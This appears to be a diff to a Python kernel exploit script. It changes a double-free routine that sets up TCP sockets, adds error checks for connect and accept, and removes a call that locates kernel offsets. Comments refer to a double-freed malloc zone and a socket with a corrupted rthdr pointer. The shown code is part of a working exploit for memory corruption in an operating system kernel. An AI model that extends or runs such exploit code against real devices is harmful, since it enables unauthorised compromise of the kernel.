@@ -1882,13 +1882,21 @@ def double_free_reqs2(sds):
         sd_client = new_tcp_socket()
         print("sd_client: %d" % sd_client)
 
-        if u32_to_i32(sc.syscalls.connect(sd_client, server_addr, 16)) == -1:
+        ret = sc.syscalls.connect(sd_client, server_addr, 16)
+        if u32_to_i32(ret) == -1:
             raise Exception(
                 "connect error: %d\n%s"
                 % (sc.syscalls.connect.errno, sc.syscalls.connect.get_error_string())
             )
 
+        print("connected, ret: %d" % ret)
+
         sd_conn = sc.syscalls.accept(sd_listen, 0, 0)
+        if u32_to_i32(sd_conn) == -1:
+            raise Exception(
+                "accept error: %d\n%s"
+                % (sc.syscalls.accept.errno, sc.syscalls.accept.get_error_string())
+            )
         print("sd_conn: %d" % sd_conn)
 
         linger_buf = alloc(8)
@@ -3234,8 +3242,6 @@ def find_additional_offsets():
     SELECTED_KERNEL_OFFSETS["VMSPACE_MAP_PMAP"] = vm_map_pmap_offset
     SELECTED_KERNEL_OFFSETS["VMSPACE_MAP_VMID"] = vm_map_vmid_offset
 
-
-find_additional_offsets()
 
 # k100_addr is double freed 0x100 malloc zone address
 # dirty_sd is the socket whose rthdr pointer is corrupt
